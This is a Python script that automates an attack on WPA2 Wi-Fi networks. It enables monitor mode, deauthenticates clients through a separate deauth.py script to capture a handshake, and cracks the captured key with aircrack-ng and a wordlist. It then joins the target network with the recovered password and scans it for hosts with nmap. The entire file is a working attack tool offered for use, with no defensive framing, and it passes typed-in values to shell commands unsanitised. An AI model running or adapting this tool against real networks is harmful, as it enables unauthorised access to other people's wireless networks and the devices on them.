#!/usr/bin/python3

import subprocess
import time
import sys

iface = 'wlp2s0mon'

subprocess.run('sudo airmon-ng check kill', shell=True)
subprocess.run('sudo airmon-ng start wlp2s0', shell=True)
print('Starting airodump-ng...')
print('Timeout is 60 seconds')
def monstop():
    subprocess.run('sudo airmon-ng stop wlp2s0mon', shell=True)
    subprocess.run('sudo systemctl start wpa_supplicant', shell=True)
    subprocess.run('sudo systemctl start NetworkManager', shell=True)
while 1:
    subprocess.run(f'sudo airodump-ng -p -60 {iface}', shell=True, timeout=60)
    #subprocess.run('cat session.txt', shell=True)
    try:
        time.sleep(1)
        tbssid = input('Enter the BSSID of the target: ').strip()
        chan = int(input('Enter the channel of the target: '))
        subprocess.run(f"echo '{tbssid}' > session-bssid.txt", shell=True)
        subprocess.run(f"echo '{chan}' >> session-bssid.txt", shell=True)
        subprocess.run(f'sudo airmon-ng start {iface} {chan}', shell=True)
        time.sleep(1)
        subprocess.run('sudo python3 deauth.py', shell=True)
        subprocess.run(f'sudo airodump-ng --bssid {tbssid} -c {chan} --write session {iface}', shell=True, timeout=600)
        time.sleep(1)
        subprocess.run(f'sudo aircrack-ng -a 2 -b {tbssid} -p 1 -l psk.txt -w wordlist.list session-01.cap', shell=True, timeout=1200)
        bssid = subprocess.check_output('head -n 1 session-bssid.txt', shell=True, text=True).strip()
        psk = subprocess.check_output('head -n 1 psk.txt', shell=True, text=True).strip()
        enter = input(f'\nAccess {tbssid}? Yes or No: ').strip()
        if enter == 'y' or enter == 'Y' or enter == 'yes': 
            monstop()
            print('Connecting to network...')
            time.sleep(10)
            subprocess.run(f'nmcli d wifi connect {bssid} password {psk}', shell=True)
            hd = input(f'\nPreform Host Discovery? Yes or No: ').strip()
            if hd == 'y' or hd == 'Y' or hd == 'yes': 
                inet = subprocess.check_output("ip -o -f inet a show | awk '/scope global/ {print $4}'", shell=True, text=True)
                subprocess.run(f'nmap -sn --open -T 4 -v {inet}', shell=True, timeout=120)
                print(f'Currently connected to {bssid}')
                print(f'BSSID: {bssid}\nWPA2 password: {psk}')
            else:
                print(f'Currently connected to {bssid}')
                print(f'BSSID: {bssid}\nWPA2 password: {psk}')
        else:
            monstop()
            print(f'BSSID: {bssid}\nWPA2 password: {psk}')
        subprocess.run(f"sudo rm session-01.cap session-01.csv session-01.kismet.csv session-01.kismet.netxml session-01.log.csv deauthsession-01.cap deauthsession-01.csv deauthsession-01.kismet.csv deauthsession-01.kismet.netxml deauthsession-01.log.csv", shell=True)
        sys.exit(1)
    except KeyboardInterrupt:
        subprocess.run(f"sudo rm session-01.cap session-01.csv session-01.kismet.csv session-01.kismet.netxml session-01.log.csv", shell=True)
        sys.exit(1)
            
#subprocess.run('sudo systemctl start NetworkManager', shell=True)
